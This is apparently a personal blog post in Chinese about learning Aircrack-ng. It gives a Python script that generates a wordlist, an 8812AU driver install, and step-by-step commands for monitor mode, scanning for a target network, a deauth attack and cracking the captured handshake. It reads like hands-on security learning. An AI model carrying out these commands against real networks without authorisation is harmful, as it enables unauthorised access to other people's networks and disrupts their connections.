# Aircrack 
- 因為平平拿了這個給我

![USB WiFi 轉接器，](<posts\Aircrack\S__6381613.jpg>)

![插進去](<posts\Aircrack\image.png>)

---

1. 先學寫字點檔:
```python
import itertools
import string

def generate_custom_wordlist(output_file):
    # 開啟檔案準備寫入 (w 模式會覆蓋舊檔)
    with open(output_file, 'w', encoding='utf-8') as f:
        
        # --- 第一部分：寫入指定的關鍵字 ---
        # 這些是你提到的特定詞彙
        specific_keywords = ['308', 'hoya']
        for word in specific_keywords:
            f.write(word + '\n')
        
        # --- 第二部分：生成 a~z 的排列組合 ---
        # string.ascii_lowercase 包含 'abcdefghijklmnopqrstuvwxyz'
        chars = string.ascii_lowercase
        
        # 設定你想生成的長度範圍（例如：從 1 位到 3 位）
        # 注意：長度越大，檔案體積會呈指數型成長！
        min_len = 1
        max_len = 3 
        
        print(f"正在生成 a-z 的組合 (長度 {min_len}~{max_len})...")
        
        for length in range(min_len, max_len + 1):
            # product 會生成所有可能的重複組合 (Cartesian product)
            # 例如 length=2 會生成 aa, ab, ac... zz
            for p in itertools.product(chars, repeat=length):
                # 將 tuple 組合成字串並寫入
                word = ''.join(p)
                f.write(word + '\n')
                
    print(f"字典檔生成完畢！存檔位置：{output_file}")

if __name__ == "__main__":
    generate_custom_wordlist('my_wordlist.txt')
```

2.
```
# ==== for WiFi 網卡驅動 (8812AU) ====
echo "正在安裝 WiFi 網卡驅動 (8812AU)..."
cd ~
git clone https://github.com/morrownr/8812au-20210820.git
cd 8812au-20210820

# 安裝編譯所需的套件
sudo apt update
sudo apt install -y dkms build-essential bc
```
3. 
用用看 aircrack
- 偵查 (Airmon-ng)
將網卡切換至監聽模式（Monitor Mode）。

`airmon-ng start wlan0`


- 確認網卡模式
首先，確保你的網卡已經切換到 Monitor Mode。
`iwconfig`

- 掃描周邊 WiFi (找到 MAC)
直接執行掃描指令，這會列出附近所有的 WiFi 訊號：

`sudo airodump-ng wlan0`

![示意圖而已](<posts\Aircrack\螢幕擷取畫面 2026-01-26 143522.png>)

這時螢幕會跳出即時更新的清單，請觀察以下欄位：
BSSID: 這就是你要找的 MAC 地址。
ESSID: 這就是 WiFi 名稱（帳號）。
操作技巧： 當你在 ESSID 欄位看到目標名稱時，對應左邊的 BSSID（格式如 AA:BB:CC:11:22:33）就是該路由器的實體地址。記下它，並注意它所在的 CH (Channel, 頻道)。



- 強制踢線 (Aireplay-ng) - 可選
如果你等不到使用者登入，紅隊通常會發送「取消認證攻擊（Deauth Attack）」強制設備斷線重連，藉此瞬間抓到握手包。

`aireplay-ng -0 5 -a [目標MAC] wlan0mon`

- 攻擊
`aircrack-ng -w my_wordlist.txt target_capture.cap`